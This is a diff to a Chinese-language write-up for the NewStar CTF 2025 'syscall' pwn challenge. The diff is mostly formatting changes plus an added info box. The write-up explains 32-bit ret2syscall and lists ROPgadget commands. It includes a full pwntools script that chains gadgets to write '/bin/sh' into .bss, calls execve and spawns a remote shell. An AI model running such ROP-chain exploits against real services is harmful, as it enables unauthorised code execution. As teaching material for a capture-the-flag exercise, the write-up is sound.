@@ -2,7 +2,16 @@
 titleTemplate: ":title | WriteUp - NewStar CTF 2025"
 ---
 
+<script setup>
+import Container from '@/components/docs/Container.vue'
+</script>
+
 # syscall
+
+<Container type='info'>
+
+本题考查需要写入 `/bin/sh` 的 ret2syscall 利用。
+</Container>
 
 ## 分析
 
@@ -41,9 +50,9 @@ Linux 的系统调用通过 `int 80h`<span data-desc>（32 位）</span> 或 `sy
 
 #### 参数传递
 
-| 系统  | 顺序                       |
-| ---- | -------------------------- |
-| 32位 | `eax` → `edx` → `ecx` → `ebx`         |
+| 系统 | 顺序                                        |
+| ---- | ------------------------------------------- |
+| 32位 | `eax` → `edx` → `ecx` → `ebx`               |
 | 64位 | `rdi` → `rsi` → `rdx` → `rcx` → `r8` → `r9` |
 
 ### 具体实现
@@ -58,14 +67,15 @@ ebx: "/bin/sh"
 ecx: 0
 edx: 0
 ```
+
 ##### ROPgadgets工具
 
 ```bash
 ROPgadget --binary syscall  --only 'pop|ret' | grep 'eax'
 ROPgadget --binary syscall  --only 'pop|ret' | grep 'ebx'
 ROPgadget --binary syscall  --only 'pop|ret' | grep 'ecx'
-ROPgadget --binary syscall  --only 'pop|ret' | grep 'edx' 
-ROPgadget --binary syscall  --string '/bin/sh' 
+ROPgadget --binary syscall  --only 'pop|ret' | grep 'edx'
+ROPgadget --binary syscall  --string '/bin/sh'
 ROPgadget --binary rop --opcode cd80c3
 ROPgadget --binary rop --only 'int'
 ```
@@ -95,16 +105,16 @@ context(arch = 'i386',os = 'linux',log_level = 'debug')
 elf = ELF('./pwn')
 io = remote('8.147.134.121',20659)
 #io=process('./pwn')
- 
+
 offset = 22
- 
+
 pop_eax = 0x080b438a
 pop_ebx = 0x08049022
 pop_ecx = 0x0804985a
 pop_edx = 0x0804985c
 int_0x80 = 0x08073a00
 bss_addr = elf.bss()
- 
+
 payload  = cyclic(offset)
 payload += p32(pop_eax)+p32(0x3)
 payload += p32(pop_edx)+p32(0x20)
@@ -116,10 +126,9 @@ payload += p32(pop_edx)+p32(0)
 payload += p32(pop_ecx)+p32(0)
 payload += p32(pop_ebx)+p32(bss_addr)
 payload += p32(int_0x80)			   #execve("/bin/sh",0,0)
- 
+
 io.sendlineafter("pwn it guys!\n",payload)
 io.sendline('/bin/sh\x00')
 io.interactive()
 
 ```
-
